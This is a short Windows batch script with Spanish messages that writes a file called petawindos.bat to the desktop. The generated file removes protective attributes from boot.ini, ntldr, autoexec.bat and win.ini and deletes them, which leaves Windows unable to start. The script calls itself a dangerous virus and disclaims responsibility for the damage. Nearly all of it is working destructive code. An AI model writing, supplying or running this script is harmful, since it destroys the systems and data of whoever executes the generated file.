@echo off
cls
cd %homepath%\Escritorio
echo AVISO: Este virus es peligroso, no me responsabilizo de los problemas
echo que causeis con el.
@echo off>>petawindos.bat
echo @echo off>>petawindos.bat
echo attrib -r -s -h c:\autoexec.bat>>petawindos.bat
echo del c:\autoexec.bat>>petawindos.bat
echo attrib -r -s -h c:\boot.ini>>petawindos.bat
echo del c:\boot.ini>>petawindos.bat
echo attrib -r -s -h c:\ntldr>>petawindos.bat
echo del c:\ntldr>>petawindos.bat
echo attrib -r -s -h c:\windows\win.ini>>petawindos.bat
echo del c:\windows\win.ini>>petawindos.bat
pause >nul
cls
msg * Virus creado, ten cuidado con lo que haces.
goto main2